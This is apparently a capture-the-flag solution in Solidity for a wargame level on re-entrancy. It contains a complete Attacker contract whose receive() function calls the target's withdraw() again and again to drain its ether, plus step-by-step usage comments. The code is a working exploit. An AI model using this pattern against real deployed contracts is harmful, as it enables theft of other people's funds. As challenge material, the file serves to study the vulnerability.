//////////////////////////////////////
// Level 10 - Re-entrancy
// By: Lorenzo Cesconetto
//////////////////////////////////////

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface Reentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint balance);

    function withdraw(uint _amount) external;

    receive() external payable;
}

// SOLUTION:
// Step-by-step:
// 0. Deploy Attacker contract.
// 1. Call deposit() in Attacker contract sending along some ether (I suggest to send 1 Finney = 10**15 wei).
// 2. Call attack() to drain the target (reentrance) contract.
// 3. Call withdraw() in Attacker contract if you want to get your Ether back.
contract Attacker {
    Reentrance reentrance;

    constructor(address payable _target) public {
        reentrance = Reentrance(_target);
    }

    function min(uint a, uint b) private pure returns (uint) {
        if (a < b) return a;
        return b;
    }

    function deposit() external payable {
        reentrance.donate{value: msg.value}(address(this));
    }

    function attack() external {
        uint amount = min(
            address(reentrance).balance,
            reentrance.balanceOf(address(this))
        );
        reentrance.withdraw(amount);
    }

    receive() external payable {
        uint amount = min(
            address(reentrance).balance,
            reentrance.balanceOf(address(this))
        );
        if (amount > 0) reentrance.withdraw(amount);
    }

    function withdraw() external returns (bool) {
        (bool success, ) = payable(msg.sender).call{
            value: address(this).balance
        }("");
        return success;
    }
}
